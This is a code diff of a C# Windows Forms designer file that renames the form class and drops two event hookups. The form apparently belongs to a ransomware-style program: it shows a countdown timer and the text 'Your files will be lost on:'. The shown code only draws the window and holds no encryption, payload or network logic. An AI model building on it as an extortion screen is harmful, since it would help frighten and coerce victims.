@@ -1,7 +1,7 @@
 ﻿
 namespace S4VEtheD4TE
 {
-    partial class Form1
+    partial class Main
     {
         /// <summary>
         ///  Required designer variable.
@@ -30,7 +30,7 @@ namespace S4VEtheD4TE
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
-            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
             this.pictureBox1 = new System.Windows.Forms.PictureBox();
             this.richTextBox1 = new System.Windows.Forms.RichTextBox();
             this.Label1 = new System.Windows.Forms.Label();
@@ -62,7 +62,6 @@ namespace S4VEtheD4TE
             this.richTextBox1.Size = new System.Drawing.Size(597, 154);
             this.richTextBox1.TabIndex = 2;
             this.richTextBox1.Text = resources.GetString("richTextBox1.Text");
-            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
             // 
             // Label1
             // 
@@ -74,7 +73,6 @@ namespace S4VEtheD4TE
             this.Label1.Size = new System.Drawing.Size(133, 32);
             this.Label1.TabIndex = 3;
             this.Label1.Text = "0:00:00:00";
-            this.Label1.Click += new System.EventHandler(this.Label1_Click_1);
             // 
             // timer1
             // 
@@ -124,7 +122,7 @@ namespace S4VEtheD4TE
             this.label4.TabIndex = 8;
             this.label4.Text = "Your files will be lost on:";
             // 
-            // Form1
+            // Main
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
@@ -139,7 +137,7 @@ namespace S4VEtheD4TE
             this.Controls.Add(this.pictureBox1);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
             this.MaximizeBox = false;
-            this.Name = "Form1";
+            this.Name = "Main";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "S4VEtheD4TE";
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
